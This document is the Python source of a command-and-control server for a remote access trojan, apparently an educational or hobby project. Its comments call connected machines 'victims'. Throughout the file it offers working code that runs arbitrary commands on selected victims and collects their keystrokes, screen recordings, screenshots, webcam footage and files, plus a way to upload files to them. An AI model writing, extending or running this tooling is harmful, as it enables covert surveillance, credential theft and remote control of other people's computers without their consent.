# Server file for multi-client support
# Functions:-
# 1.Sending commands to already connected clients.
# 2.Listen and accept connections from other clients.

# To achieve 2 tasks at same time from same program we will be using concept of Multi-Threading
# Thread 1- accepting connections from other clients
# Thread 2- sending commands to already connected clients

import socket # module help us to create sockets that act as end-point for 2-way communication between 2 processes over a network
import sys  # module help us to operate on command line and execute terminal commands from python script
import threading # module to support multi-threading
import time # module to access computer date/time
from queue import Queue # queue data structure is required
import subprocess
import cv2
import os
import pyautogui
import platform


NUMBER_OF_THREADS=2 # constant storing number of threads required in our program
JOB_NUMBER=[1,2]  # Job number 1-> thread 1 -> listening for new connections
                  #S Job number 2 -> thread 2 -> for sending commands to already connected clients

queue=Queue() # queue data structure is required to support multi-threading

all_connections = [] # list storing connection objects to all the connected clients
all_address = [] # list storing addresses of all connected clients



# function to create a socket
def create_socket():
    try:
        global host  # global variable storing host/ip of server
        global port  # global variable storing port on which server will be listening
        global s     # global variable for socket on which server will be listening
        host=""      # initialize with static ip of server
        port=33333    # any port number which is not reserved port(greater than 1023)
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # creating a socket object- AF_INET-refers to IPv4 address family, 
        #                                                       SOCK_STREAM- use connection-oriented TCP protocol,SOCK_DGRAM- UDP connection

    except socket.error as e:        # Error handling
        print("Socket creation error: "+str(e))    # prints error message 

# function to bind socket to server(attacker) and listen to incoming connections from victim

def bind_socket():
    try:
        global host
        global port
        global s
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) 
        print("Binding to port: {}".format(port)) # Attemp to bind socket to host and port

        s.bind((host,port))   # binds socket object s to host/ip of server and port number specified in port variable
                              # if host="" it means that our socket is bind to our local computer and it can accept connections from all available interfaces.
                              # socket.gethostname() returns name of local computer and socket.gethostbyname(socket.gethostname()) it resolves hostname to ip address
                              # if host=socket.gethostname() or local ip then it binds socket to local computer but it only accepts connections from loopback interface 
                              # that means only processes within same host will be able to communicate to server thereby ensuring security from external network.
                              # If we use hostname as host then first DNS resolution will be accepted and behaviour of application might be problematic
                              #so prefer to use static IP address

        # if binding is successful then socket goes into listening state
        s.listen(5)  # it can tolerate max. of 5 bad connections after that it will throw an error

    except socket.error as e:                    # Error handling
        print("Socket binding error:- "+str(e)+"\n"+"Retrying...")  # prints socket binding error
        bind_socket()                            # keeps on retrying until socket binding is successful
    

# Handling multiple connections and saving new connections to list
# Also we need to close all previous connections when we server.py file is restarted

# THREAD 1-> function for closing previous connections, accepting new connections and adding them to list
def accept_connections():

    for c in all_connections:        # closing all previous connections when file is restarted
        c.close() 

    del all_connections[:]    # clearing previous information in both lists
    del all_address[:]

    global s
    
    while True:
        try:
            conn,address=s.accept()  # accpeting a new connection

            s.setblocking(1)  # a socket object can be in 3 modes - blocking modes,non-blocking mode,timeout mode
                              # socket.setblocking() - if 1 is passed -> sets seocket to blocking mode , if 0 is passed-> sets socket to non-blocking mode
                              # by default socket is in blocking mode

            all_connections.append(conn)  # saving conn and address into the list
            all_address.append(address)

            print("Connection has been established!! with victim IP: " + address[0] +" and port: " + str(address[1])) # it prints IP and port of victim to which connection has been established

        except:
            print("Error accepting the connection!!")

# THREAD 2 -> function for 1) Showing all connected clients 2) Selecting one of the clients 3) Sending commands to that client
# Also here we will be building our custom interactive shell for performing above tasks
# Name of our shell -> KD
# Function for creating our shell -> KD
def start_KD():
    while True:
        cmd=input('KD> ')

        # list command -> it will be used to list all connected clients on prompt

        if cmd == "list" : 
            list_connections()   # funtion to list all the connected clients 
                                 # KD> list
                                 # output will be a list with entry be like:-
                                 # 0 192.168.29.1 50000 -> client_id client_ip client_port


        # select command -> it will be used to select a connected client by using client id
        # KD> select 0 -> select client_id
        elif cmd.split(' ')[0]== "select":
            cl=get_target(cmd)    # get_target() helps us to select client specified in command by passing input to it and return the corresponding connection object

            if cl:  # to check that client is still connected and didn't get disconnected in mean time i.e conn is not None
                send_target_commands(cl[0],cl[1]) # function to send commands to the target/selected victim

        elif cmd == "exit":       # to exit from server program
            for conn in all_connections:
                try:
                    conn.send('exit'.encode())
                except:
                    pass
                
            break

        elif cmd == "help":    # to print info about all valid commands
            print("1. list - command lists all active clients connected to server")
            print("2. select - command to select the target client (mandatory arguement - client id of target machine)")
            print("3. exit - command to exit from shell\n")

        else:
            print("'"+cmd+"' " + "Command not recognized!!")

# Display all active connections with clients
def list_connections():
    output=""

    for i,conn in enumerate(all_connections):
        try:                                    # sending a dummy request to client to check whether connection is active or not
            conn.send(str.encode(" "))          # sending an empty string
            conn.recv(20480)                   # waiting for client response-> if conn.recv() does not recieve any data then it will throw an exception
        except:
            del all_connections[i]              # if exception is thrown it means client has got disconnected
            del all_address[i]                  # we delete connection object and address for disconnected client
            continue

        output+=str(i) + "            " + str(all_address[i][0]) + "    " + str(all_address[i][1]) + "\n"  # adding information of active client to output

    print("-------ACTIVE CLIENTS--------" + "\n" + "CLIENT ID    IP                PORT" + "\n" + output)    # printing the list of active clients


# Selecting an client out of list of active clients using select command
def get_target(cmd): 
    try:
        client_id=cmd.split(" ")[1]   # retrieving client id of target
        client_id=int(client_id)
        conn=all_connections[client_id]   # getiing connection object of target machine
        print("You are now connected to " + str(all_address[client_id][0]))
        print(str(all_address[client_id][0]) + "> ",end="")   # In shell you will be getting output like 192.168.29.1> which will indicate that you are now
                                                       # connected to client and you can now send commands to the client
        return conn,all_address[client_id][0]+'-'+str(all_address[client_id][1])                     # return connection object of target

    except:                                  # if client id mentioned is not present then error is reported
        print("Selected client id not valid")
        return None


# to display recording
def show_video(filepath,ip):
    vid=cv2.VideoCapture(filepath)
    window_name=""
    SCREEN_SIZE=None
    if filepath == os.path.join(ip,'screen.avi'):
        window_name="LiveScreen"
        SCREEN_SIZE=pyautogui.size()
    elif filepath == os.path.join(ip,"webcam2.avi"):
        window_name="WebcamFeed"
        vid2=cv2.VideoCapture(0,cv2.CAP_DSHOW)
        width = int(vid2.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(vid2.get(cv2.CAP_PROP_FRAME_HEIGHT))
        SCREEN_SIZE=(width,height)
        vid2.release()
    cv2.namedWindow(window_name,cv2.WINDOW_NORMAL)
    cv2.resizeWindow(window_name,SCREEN_SIZE[0],SCREEN_SIZE[1])
    while vid.isOpened():
        ret,frame=vid.read()
        if ret == True:
            cv2.imshow(window_name,frame)
            cv2.waitKey(25)
        else:
            break

    vid.release()
    cv2.destroyAllWindows()

# to get screen recording of target machine - rec command
def screenCapture(conn,ip):
    print("capturing..")
    l=int(conn.recv(20480).decode())
    conn.send("start".encode())
    f=open(os.path.join(ip,"screen.avi"),"wb")
    curr_len=0
    while curr_len<l:
        print("",end="\r")
        data=conn.recv(204800000)
        curr_len+=len(data)
        print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")
        f.write(data)


    f.close()
    print("\ndone..")
    conn.send("done".encode())
    show_video(os.path.join(ip,'screen.avi'),ip)
    output=conn.recv(10240).decode()
    print(output,end="")

# to capture webcam feed of target - webcam command
def webcamCapture(conn,ip):
    conn.send('capture'.encode())
    l=int(conn.recv(20480).decode())
    if l>0:
        print("capturing..")
        conn.send("start".encode())
        f=open(os.path.join(ip,"webcam2.avi"),"wb")
        curr_len=0
        while curr_len<l:
            print("",end="\r")
            data=conn.recv(204800000)
            curr_len+=len(data)
            print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")
            f.write(data)


        f.close()
        print("\ndone..")
        conn.send("done".encode())
        show_video(os.path.join(ip,'webcam2.avi'),ip)
    else:
        print('Error accessing webcam...')
        conn.send('Error'.encode())
    output=conn.recv(10240).decode()
    print(output,end="")


# to display screenshot of target machine
def show_image(ip):
    im=cv2.imread(os.path.join(ip,'ss.jpg'))
    SCREEN_SIZE=pyautogui.size()
    cv2.namedWindow("Screenshot",cv2.WINDOW_NORMAL)
    cv2.resizeWindow("Screenshot",SCREEN_SIZE[0],SCREEN_SIZE[1])
    cv2.imshow("Screenshot",im)
    cv2.waitKey(3000)
    cv2.destroyAllWindows()


# to get screenshot of target machine - ss command
def screenshot(conn,ip):
    print("clicking")
    l=int(conn.recv(20480).decode())
    conn.send("start".encode())
    curr_len=0
    f=open(os.path.join(ip,"ss.jpg"),"wb")

    while curr_len<l:
        print("",end="\r")
        data=conn.recv(2048000)
        f.write(data)
        curr_len+=len(data)
        print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")

    f.close()
    print("\ndone")
    conn.send("done".encode())
    show_image(ip)
    output=conn.recv(20480).decode()
    print(output,end="") 

# to get file from target machine - getfile filepath command
def getfile(conn,cmd,ip):
    filepath=cmd.split(" ")[1]
    conn.send('capture'.encode())
    l=int(conn.recv(20480).decode())
    if l==0:
        print("Error in extracting file...try again")
        conn.send("Error".encode())
    else:
        print("Extracting file")
        conn.send("start".encode())
        filename=os.path.basename(filepath)
        f=open(os.path.join(ip,filename),"wb")
        curr_len=0
        while curr_len<l:
            print(end="\r")
            data=conn.recv(204800)
            curr_len+=len(data)
            f.write(data)
            print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")


        f.close()
        print("\ndone..")
        conn.send("done".encode())

    output=conn.recv(20480).decode()
    print(output,end="")

# to send file to target machine -sendfile filepath command
def sendfile(conn,cmd):
    filepath=cmd.split(" ")[1]
    try:
        f=open(filepath,"rb")
        data=f.read()
        print("Sending File")
        l=len(data)
        conn.send(str(l).encode())
        res=conn.recv(2048)
        conn.send(data)
        curr_len=0
        while curr_len<l:
            print(end="\r")
            x=int(conn.recv(20480).decode())
            curr_len+=x
            print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")


        print("\ndone..")
        conn.send("done".encode())
        f.close()
    except:
        print("Error sending file...try again")
        conn.send("0".encode())

    output=conn.recv(20480).decode()
    print(output,end="")

# to log keys at client side and recieve log file - keylogger command
def keyLogger(conn,ip):
    print("Logging keys...")
    conn.send("log".encode())
    res=conn.recv(1024).decode()
    if res == "done":
        print("Logging of keys done until ESC is pressed by client or keys pressed exceed 50 key presses")
    conn.send("ok".encode())
    l=int(conn.recv(20480).decode())
    print("Extracting logs")
    conn.send("start".encode())
    f=open(os.path.join(ip,"logs.txt"),"w")
    curr_len=0
    while curr_len<l:
        print(end="\r")
        data=conn.recv(204800)
        curr_len+=len(data)
        f.write(data.decode())
        print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")
    f.close()
    print("\nLogs recieved")
    conn.send("receive".encode())
    output=conn.recv(20480).decode()
    print(output,end="")

# Function for sending commands to target machine
def send_target_commands(conn,ip):
    try:
        os.mkdir(os.path.join(os.getcwd(),ip))
    except Exception as e:
        pass
        #print(e)
    while True:  # An infinite loop is written so that we are able to send multiple commands before closing connection
        try:
            cmd=input() # Take input command from user in variable cmd

            if cmd=="quit": # if input command is quit , then we close the connection,socket and terminal
                break


            if len(str.encode(cmd)) > 0: # str.encode() it converts string from unicode format to utf-8 format(byte format)
                                         # data is sent on network in form of bytes only..if length of data is 0 then do nothing otherwise send command to victim

                conn.sendall(str.encode(cmd)) # conn.send() is used to send data over the established connection in form of bytes
                                              # conn.send() returns number of bytes sent which might be less than total data passed to function call
                                              # It is responsibiity of application to check that entire data is transmitted and perform re-transmission if entire data is not sent at once
                                              # conn.sendall() ensures that entire data is sent and it continues to send data untill entire data is being sent and it returns None on success   

                client_response=str(conn.recv(20480),"utf-8")   # now we need to accept data from client which will contain output of our command executed on client's terminal
                                                               # conn.recv() takes an arguement which is maximum number of bytes that can be recieved at once
                                                               # conn.recv() return data in bytes which needs to be converted in utf-8 format anf then converted to str format
            
            if client_response == "Logging_keys":
                keyLogger(conn,ip)
                continue         


            if client_response == "capturing":
                screenCapture(conn,ip)
                continue

            if client_response == "clicking":
                screenshot(conn,ip)
                continue

            if client_response == "capturing_webcam" :
                #print("Function call debug")
                webcamCapture(conn,ip)
                continue

            if client_response == "sending_file":
                getfile(conn,cmd,ip)
                continue

            if client_response == "receiving_file":
                sendfile(conn,cmd)
                continue


            print(client_response,end="") #print client response and end="" is used so that next command begins from new line in terminal
        except Exception as e:
            print("Error sending commands!!")

#Thread Flow
# 1.) Create the worker threads
# 2.) Store jobs in Queue because threads looks for jobsin a queue not in a list
# 3.) Create a work function and get the queue
#     -> If job number in queue is 1, then handle the connections
#     -> If job number in queue is 2, then send commands

# Function 1 : To create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):  # we will create as many as threads we require which is stored in NUMBER_OF_THREADS(2 in this case)
        t=threading.Thread(target=work)  # creation of a thread-> target accepts function as arguement that assigns jobs to this thread i.e work function
        t.daemon=True      # daemonic threads terminate with termination of main program while non-daemonic threads do not terminate with termination of main program
        t.start()


# Function 2-> To create a queue of jobs since threads look for jobs in a queue not list
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)           # enqueue job into the queue
    queue.join()               # blocks untill all jobs in queue have been processed and task_done() is recieved for all

# Function 3 -> work function to assign tasks/jobs to threads

def work():
    while True:
        x=queue.get()           # retrieves and removes element at front of queue
        if x == 1:              # it indicates job number 1 i.e thread 1
            create_socket()     # creating socket
            bind_socket()       # binding socket to host and port
            accept_connections() # handling connections from multiple clients
        if x == 2:             # it indicates job number 2 i.e. thread 2           
            start_KD()         # start the interactive shell to select target and send commands
            queue.task_done()
        queue.task_done()

def main():
    create_workers()
    create_jobs()

if __name__ == "__main__":
    main()